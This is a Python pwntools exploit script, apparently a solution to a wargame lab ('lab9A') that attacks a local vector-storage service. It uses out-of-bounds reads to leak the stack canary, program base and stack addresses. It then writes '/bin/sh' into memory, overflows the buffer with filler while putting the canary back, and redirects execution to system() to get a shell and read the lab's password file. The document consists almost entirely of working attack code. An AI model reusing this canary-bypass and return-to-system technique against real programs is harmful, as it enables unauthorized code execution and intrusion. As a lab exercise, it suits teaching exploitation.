from pwn import * 

p = remote("127.0.0.1", 9943) 

def write(value): 
    p.sendline('1') 
    p.sendline(str(value))
    return 

def read(index):
    p.sendline('2') 
    p.sendline(str(index)) 
    p.recvuntil('DSVector['+str(index)+'] =') 
    leak = int(p.recvline())

    # If the leak is negative, we want to convert this back into an unsigned number in order to read it properly
    if(leak < 0):
        return leak + 2 ** 32 
    return leak 

def overwrite(amount):
    for i in range(amount):
        write(str(0x41414141))
    return 

def pop_shell(stack_leak, program_leak):
    # system 
    write(program_leak - 0x285ff0) 

    #/bin/sh pointer 
    write(stack_leak - 0x4a8)   
    write(stack_leak - 0x4a8)

    # Quit to cause system to be called 
    p.sendline('3') 
    p.sendline('cat /home/lab9A/.pass') 
    p.interactive() # shell :) 

# Leak the stack canary 
canary = read(257) 
print "Canary....", hex(canary)

# Leak the program location
loc = read(258) 
print "Program location....", hex(loc)

# Leak the stack location 
stack_leak = read(263) 
print "Stack leak....", stack_leak 


# Shell write: /bin/sh
write(0x6e69622f)
write(0x0068732f) 

# Filler...
overwrite(254)

# Write the canary, in order to make the program think that we have not overflowed the buffer
write(canary)
overwrite(3) 

pop_shell(stack_leak, loc)
